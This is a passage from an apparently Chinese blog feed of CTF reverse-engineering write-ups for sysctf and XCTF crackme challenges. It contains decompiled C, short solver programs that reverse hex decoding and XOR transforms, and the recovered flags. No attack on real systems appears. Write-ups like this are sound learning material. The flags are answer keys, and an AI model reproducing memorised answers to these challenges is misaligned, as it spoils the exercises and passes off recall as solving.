class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> **v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// [rsp+40h] [rbp-330h]</span></span><br><span class="line">  <span class="keyword">void</span> *v6; <span class="comment">// [rsp+48h] [rbp-328h]</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// [rsp+50h] [rbp-320h]</span></span><br><span class="line">  <span class="keyword">void</span> *v8; <span class="comment">// [rsp+58h] [rbp-318h]</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// [rsp+60h] [rbp-310h]</span></span><br><span class="line">  <span class="keyword">void</span> *v10; <span class="comment">// [rsp+68h] [rbp-308h]</span></span><br><span class="line">  <span class="keyword">void</span> *v11; <span class="comment">// [rsp+70h] [rbp-300h]</span></span><br><span class="line">  <span class="keyword">void</span> *v12; <span class="comment">// [rsp+78h] [rbp-2F8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v13; <span class="comment">// [rsp+80h] [rbp-2F0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v14; <span class="comment">// [rsp+88h] [rbp-2E8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v15; <span class="comment">// [rsp+90h] [rbp-2E0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v16; <span class="comment">// [rsp+98h] [rbp-2D8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v17; <span class="comment">// [rsp+A0h] [rbp-2D0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v18; <span class="comment">// [rsp+A8h] [rbp-2C8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v19; <span class="comment">// [rsp+B0h] [rbp-2C0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v20; <span class="comment">// [rsp+B8h] [rbp-2B8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v21; <span class="comment">// [rsp+C0h] [rbp-2B0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v22; <span class="comment">// [rsp+C8h] [rbp-2A8h]</span></span><br><span class="line">  <span class="keyword">void</span> *v23; <span class="comment">// [rsp+D0h] [rbp-2A0h]</span></span><br><span class="line">  <span class="keyword">void</span> *v24; <span class="comment">// [rsp+D8h] [rbp-298h]</span></span><br><span class="line">  <span class="keyword">void</span> *v25; <span class="comment">// [rsp+E0h] [rbp-290h]</span></span><br><span class="line">  <span class="keyword">void</span> *v26; <span class="comment">// [rsp+E8h] [rbp-288h]</span></span><br><span class="line">  <span class="keyword">void</span> *v27; <span class="comment">// [rsp+F0h] [rbp-280h]</span></span><br><span class="line">  <span class="keyword">void</span> *v28; <span class="comment">// [rsp+F8h] [rbp-278h]</span></span><br><span class="line">  <span class="keyword">void</span> *v29; <span class="comment">// [rsp+100h] [rbp-270h]</span></span><br><span class="line">  <span class="keyword">void</span> *v30; <span class="comment">// [rsp+108h] [rbp-268h]</span></span><br><span class="line">  <span class="keyword">void</span> *v31; <span class="comment">// [rsp+110h] [rbp-260h]</span></span><br><span class="line">  <span class="keyword">void</span> *v32; <span class="comment">// [rsp+118h] [rbp-258h]</span></span><br><span class="line">  <span class="keyword">void</span> *v33; <span class="comment">// [rsp+120h] [rbp-250h]</span></span><br><span class="line">  <span class="keyword">void</span> *v34; <span class="comment">// [rsp+128h] [rbp-248h]</span></span><br><span class="line">  <span class="keyword">void</span> *v35; <span class="comment">// [rsp+130h] [rbp-240h]</span></span><br><span class="line">  <span class="keyword">void</span> *v36; <span class="comment">// [rsp+138h] [rbp-238h]</span></span><br><span class="line">  <span class="keyword">void</span> *v37; <span class="comment">// [rsp+140h] [rbp-230h]</span></span><br><span class="line">  <span class="keyword">void</span> *v38; <span class="comment">// [rsp+148h] [rbp-228h]</span></span><br><span class="line">  <span class="keyword">void</span> *v39; <span class="comment">// [rsp+150h] [rbp-220h]</span></span><br><span class="line">  <span class="keyword">void</span> *v40; <span class="comment">// [rsp+158h] [rbp-218h]</span></span><br><span class="line">  <span class="keyword">void</span> *v41; <span class="comment">// [rsp+160h] [rbp-210h]</span></span><br><span class="line">  <span class="keyword">void</span> *v42; <span class="comment">// [rsp+168h] [rbp-208h]</span></span><br><span class="line">  <span class="keyword">void</span> *v43; <span class="comment">// [rsp+170h] [rbp-200h]</span></span><br><span class="line">  <span class="keyword">void</span> *v44; <span class="comment">// [rsp+178h] [rbp-1F8h]</span></span><br><span class="line">  <span class="keyword">int</span> v45; <span class="comment">// [rsp+368h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+36Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = &amp;v5;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v5, <span class="number">0</span>, <span class="number">0x320</span>uLL);</span><br><span class="line">  v5 = &amp;unk_483004;</span><br><span class="line">  v6 = &amp;unk_483007;</span><br><span class="line">  v7 = &amp;unk_483004;</span><br><span class="line">  v8 = &amp;unk_48300A;</span><br><span class="line">  v9 = &amp;unk_48300D;</span><br><span class="line">  v10 = &amp;unk_483010;</span><br><span class="line">  v11 = &amp;unk_483013;</span><br><span class="line">  v12 = &amp;unk_483016;</span><br><span class="line">  v13 = &amp;unk_483019;</span><br><span class="line">  v14 = &amp;unk_48301C;</span><br><span class="line">  v15 = &amp;unk_48301F;</span><br><span class="line">  v16 = &amp;unk_483022;</span><br><span class="line">  v17 = &amp;unk_483022;</span><br><span class="line">  v18 = &amp;unk_483022;</span><br><span class="line">  v19 = &amp;unk_483025;</span><br><span class="line">  v20 = &amp;unk_48300A;</span><br><span class="line">  v21 = &amp;unk_483019;</span><br><span class="line">  v22 = &amp;unk_483016;</span><br><span class="line">  v23 = &amp;unk_483028;</span><br><span class="line">  v24 = &amp;unk_48302B;</span><br><span class="line">  v25 = &amp;unk_483010;</span><br><span class="line">  v26 = &amp;unk_48302E;</span><br><span class="line">  v27 = &amp;unk_48301F;</span><br><span class="line">  v28 = &amp;unk_483031;</span><br><span class="line">  v29 = &amp;unk_483010;</span><br><span class="line">  v30 = &amp;unk_483034;</span><br><span class="line">  v31 = &amp;unk_483034;</span><br><span class="line">  v32 = &amp;unk_483022;</span><br><span class="line">  v33 = &amp;unk_483025;</span><br><span class="line">  v34 = &amp;unk_483034;</span><br><span class="line">  v35 = &amp;unk_483025;</span><br><span class="line">  v36 = &amp;unk_48300A;</span><br><span class="line">  v37 = &amp;unk_48302B;</span><br><span class="line">  v38 = &amp;unk_48302E;</span><br><span class="line">  v39 = &amp;unk_483034;</span><br><span class="line">  v40 = &amp;unk_48302B;</span><br><span class="line">  v41 = &amp;unk_48302E;</span><br><span class="line">  v42 = &amp;unk_483037;</span><br><span class="line">  v43 = &amp;unk_48302B;</span><br><span class="line">  v44 = &amp;unk_48303A;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">39</span>; ++i )</span><br><span class="line">    v45 = fun(*(&amp;v5 + i));</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>, argv, v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">fun</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line">  v2 = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(i + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) &gt; <span class="number">47</span> &amp;&amp; *(i + a1) &lt;= <span class="number">57</span> )</span><br><span class="line">      v3 = *(i + a1) - <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) &gt; <span class="number">96</span> &amp;&amp; *(i + a1) &lt;= <span class="number">122</span> )</span><br><span class="line">      v3 = *(i + a1) - <span class="number">87</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) &gt; <span class="number">64</span> &amp;&amp; *(i + a1) &lt;= <span class="number">90</span> )</span><br><span class="line">      v3 = *(i + a1) - <span class="number">55</span>;</span><br><span class="line">    v2 = <span class="number">16</span> * v2 + v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题除了有点废手就没什么了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">80</span>]=&#123;<span class="number">0x37</span>,<span class="number">0x33</span>,<span class="number">0x37</span>,<span class="number">0x39</span>,<span class="number">0x37</span>,<span class="number">0x33</span>,<span class="number">0x36</span>,<span class="number">0x33</span>,<span class="number">0x37</span>,<span class="number">0x34</span>,<span class="number">0x36</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x62</span>,<span class="number">0x37</span>,<span class="number">0x37</span>,</span><br><span class="line">    <span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x35</span>,<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x36</span>,<span class="number">0x34</span>,<span class="number">0x36</span>,<span class="number">0x34</span>,<span class="number">0x36</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x36</span>,<span class="number">0x36</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,</span><br><span class="line">    <span class="number">0x33</span>,<span class="number">0x37</span>,<span class="number">0x36</span>,<span class="number">0x31</span>,<span class="number">0x33</span>,<span class="number">0x39</span>,<span class="number">0x36</span>,<span class="number">0x36</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x35</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x36</span>,<span class="number">0x36</span>,<span class="number">0x33</span>,<span class="number">0x31</span>,</span><br><span class="line">    <span class="number">0x33</span>,<span class="number">0x31</span>,<span class="number">0x36</span>,<span class="number">0x34</span>,<span class="number">0x33</span>,<span class="number">0x36</span>,<span class="number">0x33</span>,<span class="number">0x31</span>,<span class="number">0x33</span>,<span class="number">0x36</span>,<span class="number">0x36</span>,<span class="number">0x33</span>,<span class="number">0x33</span>,<span class="number">0x39</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x33</span>,<span class="number">0x31</span>,</span><br><span class="line">    <span class="number">0x33</span>,<span class="number">0x39</span>,<span class="number">0x33</span>,<span class="number">0x38</span>,<span class="number">0x36</span>,<span class="number">0x32</span>,<span class="number">0x33</span>,<span class="number">0x39</span>,<span class="number">0x37</span>,<span class="number">0x64</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> flag[<span class="number">80</span>];</span><br><span class="line">    <span class="keyword">int</span> v3,v2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">80</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a[i] &gt; <span class="number">47</span> &amp;&amp; a[i] &lt;= <span class="number">57</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = a[i] - <span class="number">48</span>;</span><br><span class="line">            a[i]= v3;</span><br><span class="line">            flag[i]=a[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( a[i] &gt; <span class="number">96</span> &amp;&amp; a[i] &lt;= <span class="number">122</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = a[i] - <span class="number">87</span>;</span><br><span class="line">            a[i]= v3;</span><br><span class="line">            flag[i]=a[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( a[i] &gt; <span class="number">64</span> &amp;&amp; a[i] &lt;= <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v3 = a[i] - <span class="number">55</span>;</span><br><span class="line">            a[i]= v3;</span><br><span class="line">            flag[i]=a[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            a[i]= <span class="number">0</span>;</span><br><span class="line">            flag[i]=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">80</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(flag[i]!= <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%0x&quot;</span>,flag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着16进制字符串。</p><blockquote><p>sysctf{w45eddd6c47a9f8e2f11d616c98198b9}</p></blockquote><h1 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h1><p><a href="https://pan.baidu.com/s/14LzmZK_3QGRU-uN9IKaetg">附件链接</a> 提取码：0000<br>拖入ida中，查看main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You got something good for me?\n&gt;&quot;</span>, argv, envp);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%33s&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( j_strlen_ifunc(&amp;v6, &amp;v6) == <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    crypto(&amp;v6);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;checking...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( check(&amp;v6) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Well done,h4cker!&quot;</span>, &amp;v6, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;O0ops....&quot;</span>, &amp;v6, v5);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;O0ops....&quot;</span>, &amp;v6, v3);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">crypto</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">55</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v3 &lt;= <span class="number">32</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(v3 + a1) -= <span class="number">2</span>;</span><br><span class="line">    result = (v3 + a1);</span><br><span class="line">    *result ^= v2;</span><br><span class="line">    ++v3;</span><br><span class="line">    ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">check</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  sleep(<span class="number">2L</span>L);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) != byte_6D4100[i] )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个异或加一个比较。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v2 = <span class="number">55</span>;</span><br><span class="line">    <span class="keyword">int</span> v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">33</span>];</span><br><span class="line">    <span class="keyword">char</span> result[<span class="number">33</span>];</span><br><span class="line">    <span class="keyword">int</span> byte_6D4100[<span class="number">33</span>]=&#123;<span class="number">0x53</span>,<span class="number">0x52</span>,<span class="number">0x66</span>,<span class="number">0x5F</span>,<span class="number">0x42</span>,<span class="number">0x4F</span>,<span class="number">0x71</span>,<span class="number">0x50</span>,<span class="number">0xD</span>,<span class="number">0x21</span>,<span class="number">0x28</span>,<span class="number">0x1F</span>,<span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x35</span>,<span class="number">0x18</span>,<span class="number">0x26</span>,<span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0x39</span>,<span class="number">0x2E</span>,<span class="number">0x2B</span>,<span class="number">0x16</span>,<span class="number">0x7F</span>,<span class="number">0x24</span>,<span class="number">0x29</span>,<span class="number">0x25</span>,<span class="number">0x3A</span>,<span class="number">0xC</span>,<span class="number">0x1F</span>,<span class="number">0x37</span>,<span class="number">9</span>,<span class="number">0x25</span>,<span class="number">0x67</span>,<span class="number">0x2C</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = byte_6D4100[i];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        result[i] = flag[i]^v2;</span><br><span class="line">        result[i] += <span class="number">2</span>;</span><br><span class="line">        v2++;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,result[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{uNp4ck_1s_b@sic_5kill_Of_r3}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界</title>
      <link href="/2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>/2021/03/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="Shuffle"><a href="#Shuffle" class="headerlink" title="Shuffle"></a>Shuffle</h1><a id="more"></a><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=4942&page=1">题目链接</a><br>ida64打开，进入main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">v11 = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">v12 = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">v13 = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">v14 = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">v15 = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">v16 = <span class="string">&#x27;&#123;&#x27;</span>;</span><br><span class="line">v17 = <span class="string">&#x27;W&#x27;</span>;</span><br><span class="line">v18 = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">v19 = <span class="string">&#x27;l&#x27;</span>;</span><br><span class="line">v20 = <span class="string">&#x27;c&#x27;</span>;</span><br><span class="line">v21 = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">v22 = <span class="string">&#x27;m&#x27;</span>;</span><br><span class="line">v23 = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">v24 = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">v25 = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">v26 = <span class="string">&#x27;o&#x27;</span>;</span><br><span class="line">v27 = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">v28 = <span class="string">&#x27;t&#x27;</span>;</span><br><span class="line">v29 = <span class="string">&#x27;h&#x27;</span>;</span><br><span class="line">v30 = <span class="string">&#x27;e&#x27;</span>;</span><br><span class="line">v31 = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">v32 = <span class="string">&#x27;S&#x27;</span>;</span><br><span class="line">v33 = <span class="string">&#x27;E&#x27;</span>;</span><br><span class="line">v34 = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">v35 = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">v36 = <span class="string">&#x27;O&#x27;</span>;</span><br><span class="line">v37 = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">v38 = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">v39 = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">v40 = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">v41 = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">v42 = <span class="string">&#x27;4&#x27;</span>;</span><br><span class="line">v43 = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">v44 = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">v45 = <span class="string">&#x27;T&#x27;</span>;</span><br><span class="line">v46 = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">v47 = <span class="string">&#x27;!&#x27;</span>;</span><br><span class="line">v48 = <span class="string">&#x27;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>SECCON{Welcome to the SECCON 2014 CTF!}</p></blockquote><h1 id="666"><a href="#666" class="headerlink" title="666"></a>666</h1><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=1&id=5573&page=1">题目链接</a><br>ida64打开</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> 